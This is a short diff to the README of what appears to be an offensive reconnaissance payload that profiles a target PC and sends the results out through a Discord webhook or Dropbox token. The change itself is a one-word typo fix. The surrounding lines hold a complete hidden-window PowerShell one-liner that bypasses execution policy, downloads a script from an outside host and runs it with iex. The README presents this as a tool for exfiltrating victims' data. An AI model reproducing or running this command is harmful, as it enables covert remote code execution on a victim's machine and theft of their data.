@@ -64,7 +64,7 @@ This program enumerates a target PC to collect as much recon data as possible fo
 
 `$db` is the variable that stores your dropbox token 
 
-Fill in either or both of these to methods to exfil your collected data
+Fill in either or both of these two methods to exfil your collected data
 
 ```
 powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/aucrjmf | iex
